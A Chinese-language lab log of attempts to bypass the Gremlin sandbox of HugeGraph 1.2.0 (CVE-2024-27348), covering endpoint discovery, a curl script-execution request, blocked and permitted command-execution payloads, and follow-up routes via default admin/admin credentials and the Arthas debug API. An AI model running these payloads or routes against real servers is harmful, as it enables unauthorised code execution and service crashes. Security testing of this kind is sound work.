# HugeGraph 1.2.0 gremlin 沙箱绕过实测记录(2026-08)

靶场: HugeGraph 1.2.0, 图名 `hugegraph`, 根路径 `GET /` 返回版本信息。

## 关键端点发现(实测)

- `GET /` → `{"service":"hugegraph","version":"1.2.0","apis":["arthas","auth","cypher",...,"gremlin",...]}`
- `GET /graphs` → `{"graphs":["hugegraph"]}`(图列表)
- **gremlin 端点 = `/gremlin`**(裸路径), NOT `/apis/gremlin` 或 `/graphs/hugegraph/gremlin`(都 404)
- 其他 API 前缀 = `/graphs/{graph}/...`(如 `/graphs/hugegraph/graph/vertices`)
- `/graphs/hugegraph/schema/propertykeys` → `{"propertykeys":[]}`(图通常为空, 数据面没用)

## gremlin 执行

```bash
curl -s --compressed -X POST http://HOST:8080/gremlin \
  -H "Content-Type: application/json" \
  -d '{"gremlin":"1+2","bindings":{},"language":"gremlin-groovy"}'
# → {"requestId":"...","status":{"code":200},"result":{"data":[3],"meta":{}}}
```

- 响应可能 gzip 压缩, 必须 `--compressed` 或手动解压
- `Thread.sleep(2000)` 可执行 → **沙箱是黑名单式, 不是完全禁用**
- 报错 "No such property: g" → 默认无 `g` 遍历变量(此实例 graph 数据为空, 用脚本面)

## 沙箱拦截(实测)

- `'ls /'.execute().text` → 403 "Not allowed to execute command via Gremlin"
- `new ProcessBuilder('ls','/').start()` → 403 同上
- `Runtime.getRuntime().exec('ls /')` → 403 同上(即使反射 `Class.forName('java.lang.Runtime').getMethod('exec',...).invoke(...)` 也被拦)
- `new GroovyShell().evaluate(...)` / `ScriptEngineManager` → 403 "Not allowed to read file via Gremlin"

## 可用的(绕过参考)

- `Class.forName('java.lang.Runtime')` → 返回类对象 ✅
- `Class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null)` → 拿到 Runtime 实例 ✅
- `Thread.currentThread().getContextClassLoader()` → 可用 ✅
- `getRuntime()` 拿到实例后再 exec → 仍被拦 ❌(exec 调用被 hook)

结论: 此实例沙箱 hook 了 exec/ProcessBuilder/文件读取, 反射 exec 也会被 SecurityManager 拦。
CVE-2024-27348 的公开绕过链需要更深(如 Unsafe/MethodHandle 或直接打 Auth API), 时间盒内未打通。
留意: 某些脚本会让服务 ConnectionReset(如遍历 getDeclaredMethods 触发 StackOverflowError), 打崩后等几秒自动恢复。

## 高价值替代路径(未全试)

- `POST /graphs/hugegraph/auth/login` 默认凭据 admin/admin → 认证后可能放开沙箱限制
- Arthas API (`PUT /apis/arthas`) — HugeGraph 自带 Arthas 调试接口, 若开放=直接 RCE
- `GET /apis` 完整列表可枚举所有接口面
